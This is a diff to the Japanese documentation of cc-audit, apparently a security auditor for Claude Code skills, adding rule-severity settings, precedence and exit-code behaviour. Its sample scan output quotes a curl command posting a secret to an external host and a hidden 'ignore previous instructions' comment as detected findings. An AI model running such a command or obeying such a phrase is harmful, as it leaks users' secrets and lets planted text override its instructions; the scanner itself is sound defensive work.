@@ -73,6 +73,16 @@ ignore:
   include_node_modules: false
   include_vendor: false
 
+# ルール深刻度設定（v0.5.0+）
+# 検出深刻度とは別にexit codeを制御
+severity:
+  default: error          # デフォルトのルール深刻度: error または warn
+  warn:                   # 警告扱いするルール（報告はするがCIを失敗させない）
+    - "PI-001"
+    - "PI-002"
+  ignore:                 # 完全にスキップするルール（disabled_rulesとマージ）
+    - "OP-001"
+
 # 特定のルールを無効化
 disabled_rules:
   - "PE-001"
@@ -123,6 +133,80 @@ cc-audit ./my-skill/
 
 # CLI --verbose + 設定のstrict: true - 両方がアクティブ
 cc-audit --verbose ./my-skill/
+```
+
+---
+
+# ルール深刻度設定（v0.5.0+）
+
+cc-auditは2種類の深刻度を区別します：
+
+| 概念 | 値 | 目的 |
+|------|-----|------|
+| **検出深刻度** | critical, high, medium, low | 検出された問題の深刻さを示す |
+| **ルール深刻度** | error, warn | CIのexit codeを制御 |
+
+## 設定方法
+
+```yaml
+# .cc-audit.yaml
+severity:
+  default: error          # デフォルト: 全ルールがエラー
+  warn:                   # 警告扱いするルール
+    - "PI-001"            # プロンプトインジェクション - 報告のみ、CIは失敗しない
+    - "PI-002"
+  ignore:                 # 完全にスキップするルール
+    - "OP-001"            # disabled_rulesとマージされる
+```
+
+## 優先順位
+
+ルール深刻度は以下の順序で適用されます: **ignore > warn > default**
+
+1. ルールが`severity.ignore`または`disabled_rules`にある場合、完全にスキップ
+2. ルールが`severity.warn`にある場合、警告扱い（exit 0）
+3. それ以外は`severity.default`を適用（デフォルト: error）
+
+## Exit Code動作
+
+| 条件 | Exit Code |
+|------|-----------|
+| 検出なし | 0 |
+| 警告のみ | 0 |
+| エラーあり | 1 |
+| `--warn-only`フラグ | 常に0 |
+| `--strict`フラグ | 検出があれば1（エラーでも警告でも） |
+
+## 出力例
+
+```
+cc-audit v0.5.0 - Claude Code Security Auditor
+
+Scanning: ./my-skill/
+
+[ERROR] EX-001: Potential data exfiltration detected
+  Location: scripts/setup.sh:15
+  Code: curl -d $SECRET https://external.com
+
+[WARN] PI-001: Prompt injection pattern detected
+  Location: hooks/pre-commit.toml:8
+  Code: <!-- ignore previous instructions -->
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Summary: 1 error, 1 warning (1 critical, 0 high, 1 medium, 0 low)
+Result: FAIL (exit code 1)
+```
+
+## v0.4.xからの移行
+
+**破壊的変更:** v0.5.0ではデフォルト動作が変更されました。以前はcritical/highの検出のみがexit 1を返していましたが、現在は全ての検出がデフォルトでexit 1を返します。
+
+以前の動作に戻すには：
+```bash
+# オプション1: 初回ベースラインスキャンに--warn-onlyを使用
+cc-audit --warn-only ./my-skill/
+
+# オプション2: 設定で特定のルールを警告として設定
 ```
 
 ---
